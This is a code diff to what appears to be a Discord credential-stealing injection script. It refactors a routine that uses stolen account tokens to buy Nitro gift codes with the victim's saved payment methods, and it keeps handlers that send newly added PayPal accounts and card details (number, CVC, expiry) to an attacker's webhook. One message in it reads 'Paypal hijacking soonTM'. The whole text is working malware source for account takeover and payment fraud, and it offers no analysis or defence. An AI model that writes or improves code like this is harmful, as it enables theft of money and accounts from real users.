@@ -83,7 +83,8 @@ const discordPath = (function () {
 function updateCheck() {
     const { resourcePath, app } = discordPath;
     if (resourcePath === undefined || app === undefined) return;
-    const appPath = path.join(resourcePath, "app"); const packageJson = path.join(appPath, "package.json");
+    const appPath = path.join(resourcePath, "app"); 
+    const packageJson = path.join(appPath, "package.json");
     const resourceIndex = path.join(appPath, "index.js");
     const indexJs = `corenum`; 
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
@@ -203,35 +204,39 @@ const Purchase = async (token, id, _type, _time) => {
     xmlHttp.responseText`);
     if (req["gift_code"]) {
         return "https://discord.gift/" + req["gift_code"];
-    } else return "failed";
+    } else return null;
 };
 
 const buyNitro = async (token) => {
     const data = await fetchBilling(token);
-    if (data === "") return "";
-
+    const failedMsg = "Failed to Purchase ❌";
+    if (!data) return failedMsg;
+  
+    let IDS = [];
     data.forEach((x) => {
-        if (!x.invalid) {
-            let sourceID = x.id;
-            const first = Purchase(token, sourceID, "boost", "year");
-            if (first !== "failed") {
-                return first;
-            } else {
-                const second = Purchase(token, sourceID, "boost", "month");
-                if (second !== "failed") {
-                    return second;
-                } else {
-                    const third = Purchase(token, sourceID, "classic", "month");
-                    if (third !== "failed") {
-                        return third;
-                    } else {
-                        return "Failed to Purchase ❌";
-                    }
-                }
-            }
+      if (!x.invalid) {
+        IDS = IDS.concat(x.id);
+      }
+    });
+    for (let sourceID in IDS) {
+      const first = Purchase(token, sourceID, "boost", "year");
+      if (first !== null) {
+        return first;
+      } else {
+        const second = Purchase(token, sourceID, "boost", "month");
+        if (second !== null) {
+          return second;
+        } else {
+          const third = Purchase(token, sourceID, "classic", "month");
+          if (third !== null) {
+            return third;
+          } else {
+            return failedMsg;
+          }
         }
-    })
-};
+      }
+    }
+  };
 
 const getNitro = (flags) => {
     switch (flags) {
@@ -442,7 +447,7 @@ const PaypalAdded = async (token) => {
                 fields: [
                     {
                         name: "**Paypal Added**",
-                        value: `Time to buy some nitro baby 😩`,
+                        value: `Paypal hijacking soonTM`,
                         inline: false,
                     },
                     {
@@ -465,12 +470,6 @@ const PaypalAdded = async (token) => {
     };
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
-    if (config.auto_buy_nitro === true) {
-        setTimeout(() => {
-            nitroBought(token).catch(console.error);
-        }, 7500);
-    }
-
 };
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
@@ -510,12 +509,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     };
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
-    if (config.auto_buy_nitro === true) {
-        setTimeout(() => {
-            nitroBought(token).catch(console.error);
-        }, 7500);
-    }
-
 };
 
 const nitroBought = async (token) => {
@@ -556,7 +549,7 @@ const nitroBought = async (token) => {
         ],
     };
     if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
-    if not code.includes("undefined") {
+    if (!code.includes("undefined")) {
         hooker(content);
     }
 };
